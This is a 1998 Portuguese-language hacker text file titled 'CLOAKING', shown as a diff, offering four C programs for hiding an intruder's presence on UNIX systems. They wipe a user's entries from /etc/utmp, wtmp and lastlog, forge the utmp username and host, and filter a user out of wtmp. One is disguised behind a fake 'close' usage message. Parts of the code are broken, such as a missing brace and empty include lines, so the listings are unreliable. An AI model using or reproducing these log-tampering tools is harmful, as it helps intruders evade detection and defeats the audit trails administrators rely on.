@@ -1,0 +1,302 @@
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
+                                 
+                               19 CLOAKING 19
+
+                                    BY
+
+                                 DEAD*POOL
+
+           Os programas seguem a ordem dada na apresenta‡ao de cada um deles.
+
+           PROG 1
+
+           Para isso vocˆ vai ter que editar /etc/utmp, /usr/adm/wtmp and
+           /usr/adm/lastlog.
+           Eles nao podem ser editados a mao livre, vocˆ vai precisar de um
+           programa especifico para isso.
+
+           PROG 2
+
+           Esse programa apaga totalmente a sua presen‡a nas logs de um
+           sistema UNIX.
+           Funciona em SCO, BSD, Ultrix, HP/UX, ou qualquer outra coisa
+           compativel.
+           
+           PROG 3
+
+           Esse programa funciona na maioria das maquinas UNIX.
+           O que ele faz ‚ mudar seu "userid" e "x25" pra qualquer coisa que
+           você quiser. Isso s¢ afeta programas como "write" e "who". Ele nao
+           te d  acesso diferente, s¢ pode ser usado entao para mudar sua
+           identidade real.
+
+           PROG 4
+
+           Esse programa le o "wtmp" no diret¢rio e escreve "wtmp.out".
+
+
+
+
+--------------CORTE AQUI PROG 1
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+
+int f;
+
+void kill_utmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+
+  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
+        while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                          bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+                          lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+                          write (f, &utmp_ent, sizeof (utmp_ent));
+                  }
+        close(f);
+  }
+}
+
+void kill_wtmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+    long pos;
+
+    pos = 1L;
+    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
+
+        while(pos != -1L) {
+           lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
+           if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
+                pos = -1L;
+           } else {
+                if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                        bzero((char *)&utmp_ent,sizeof(struct utmp ));
+                        lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+                        write (f, &utmp_ent, sizeof (utmp_ent));
+                        pos = -1L;
+                } else pos += 1L;
+           }
+        }
+        close(f);
+  }
+}
+
+void kill_lastlog(who)
+char *who;
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+
+        if ((pwd=getpwnam(who))!=NULL) {
+
+           if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
+                  lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+                  bzero((char *)&newll,sizeof( newll ));
+                  write(f, (char *)&newll, sizeof( newll ));
+                  close(f);
+           }
+
+    } else printf("%s: ?\n",who);
+}
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+    if (argc==2) {
+           kill_lastlog(argv[1]);
+           kill_wtmp(argv[1]);
+           kill_utmp(argv[1]);
+           printf("Zap2!\n");
+    } else
+    printf("Error.\n");
+}
+-----------CORTE AQUI PROG 1
+
+
+----------------CORTE AQUI PROG 2
+#include <fcntl.h>
+#include <utmp.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <lastlog.h>
+
+main(argc, argv)
+    int     argc;
+    char    *argv[];
+{
+    char    *name;
+    struct utmp u;
+    struct lastlog l;
+    int     fd;
+    int     i = 0;
+    int     done = 0;
+    int     size;
+
+    if (argc != 1) {
+         if (argc >= 1 && strcmp(argv[1], "cloakme") == 0) {
+             printf("You are now cloaked\n");
+             goto start;
+                                                           }
+         else {
+              printf("close successful\n");
+              exit(0);
+              }
+                   }
+    else {
+         printf("usage: close [file to close]\n");
+         exit(1);
+         }
+start:
+    name = (char *)(ttyname(0)+5);
+    size = sizeof(struct utmp);
+
+    fd = open("/etc/utmp", O_RDWR);
+    if (fd < 0)
+        perror("/etc/utmp");
+    else {
+        while ((read(fd, &u, size) == size) && !done) {
+            if (!strcmp(u.ut_line, name)) {
+                done = 1;
+                memset(&u, 0, size);
+                lseek(fd, -1*size, SEEK_CUR);
+                write(fd, &u, size);
+                close(fd);
+            }
+        }
+    }
+
+
+    size = sizeof(struct lastlog);
+    fd = open("/var/adm/lastlog", O_RDWR);
+    if (fd < 0)
+        perror("/var/adm/lastlog");
+    else {
+        lseek(fd, size*getuid(), SEEK_SET);
+        read(fd, &l, size);
+        l.ll_time = 0;
+        strncpy(l.ll_line, "ttyq2 ", 5);
+        gethostname(l.ll_host, 16);
+        lseek(fd, size*getuid(), SEEK_SET);
+        close(fd);
+    }
+}
+
+-------------------CORTE AQUI PROG 2
+
+
+-----------------CORTE AQUI PROG 3
+*/
+
+#include <stdio.h>
+#include <utmp.h>
+#include <sys/types.h>
+
+#include <lastlog.h>
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+ FILE *f;
+ struct utmp u;
+
+ int v=ttyslot(1);
+ if(v==-1)
+ {
+  fprintf(stderr,"Can't find terminal.\n");
+  exit(1);
+
+ if(argc!=3)
+ {
+  fprintf(stderr,"Args!\n");
+  exit(1);
+ }
+ f=fopen("/etc/utmp","r+");
+ if(f==NULL)
+ {
+  fprintf(stderr,"Utmp has escaped!\n");
+  exit(1);
+ }
+ if(fseek(f,v*sizeof(u),0)==-1)
+ {
+  fprintf(stderr,"Garbage utmp\n");
+  exit(1);
+ }
+ if(fread((char *)&u,sizeof(u),1,f)!=1)
+ {
+  fprintf(stderr,"Write failed\n");
+  exit(1);
+ }
+
+ strncpy(u.ut_name,argv[1],8);
+ strncpy(u.ut_host,argv[2],16);
+ if(fseek(f,v*sizeof(u),0)==-1)
+ {
+  fprintf(stderr,"Seek failed\n");
+  exit(1);
+ }
+ fwrite((char *)&u,sizeof(u),1,f);
+ fclose(f);
+}
+------------CORTE AQUI PROG 3
+
+          
+-------------------CORTE AQUI PROG 4
+#include        <utmp.h>
+#include        <stdio.h>
+#include        <time.h>
+#include        <sys/time.h>
+
+FILE *Wfile, *Wout;
+
+struct utmp myutmp;
+
+main(argc,argv) 
+int argc;
+char *argv[];
+{
+        char username[20];
+        char yesorno[5];
+        long thetime, posi;
+
+        if (argc<2) {
+                printf("\n\n");
+                printf("Enter username to zap from the wtmp: ");
+                scanf("%s",username);
+        } else strcpy(username,argv[1]);
+
+        printf("\nopening file...\n");
+        if ((Wfile = fopen("wtmp","r"))==NULL)
+                { printf("no open file\n"); exit(0); }
+        printf("\opening output file...\n");
+        if ((Wout = fopen("wtmp.out","wr"))==NULL)
+                { printf("no open output file...\n"); exit(0); }
+
+        printf("working...\n");
+        while(!feof(Wfile)) {
+                fread(&myutmp,sizeof(myutmp),1,Wfile);
+                if (strncmp(myutmp.ut_name,username,8))
+                        fwrite(&myutmp,sizeof(myutmp),1,Wout); 
+        }
+        fclose(Wfile);
+        fclose(Wout);
+}
+----------------CORTE AQUI PROG 4
+
+           1998 FW - corporation
+
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
